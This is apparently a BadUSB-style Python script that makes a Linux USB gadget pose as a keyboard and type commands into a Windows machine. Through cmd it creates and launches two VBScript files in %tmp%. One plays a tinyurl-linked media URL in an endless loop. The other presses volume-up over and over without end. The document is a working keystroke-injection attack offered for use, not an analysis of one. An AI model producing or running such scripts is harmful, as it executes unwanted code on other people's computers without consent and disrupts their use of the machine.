from time import sleep
from keyboard import Keyboard
from keytranslation import *

kb = Keyboard('/dev/hidg0')

sleep(.500)
kb.press_key(KEY_R, [KEY_MOD_LMETA])
sleep(.200)
kb.write_line('cmd')
sleep(.500)
kb.write_line('del %tmp%\\rickyou.vbs')
sleep(.200)
kb.write_line('del %tmp%\\volup.vbs')
sleep(.200)
kb.write_line('cd %tmp% && copy con rickyou.vbs')
kb.write_line('While true')
kb.write_line('Dim oPlayer')
kb.write_line('Set oPlayer = CreateObject("WMPlayer.OCX")')
kb.write_line('oPlayer.URL = "http://tinyurl.com/s63ve48"')
kb.write_line('oPlayer.controls.play')
kb.write_line('While oPlayer.playState <> 1 \' 1 = Stopped')
kb.write_line('WScript.Sleep 100')
kb.write_line('Wend')
kb.write_line('oPlayer.close')
kb.write_line('Wend')
sleep(.100)

kb.press_key(KEY_Z, [KEY_MOD_LCTRL])
kb.write_line('')

kb.write_line('copy con volup.vbs')
kb.write_line('do')
kb.write_line('Set WshShell = CreateObject("WScript.Shell")')
kb.write_line('WshShell.SendKeys(chr(&hAF))')
kb.write_line('loop')

kb.press_key(KEY_Z, [KEY_MOD_LCTRL])
kb.write_line('')

kb.write_line('start rickyou.vbs && volup.vbs')
kb.write_line('exit')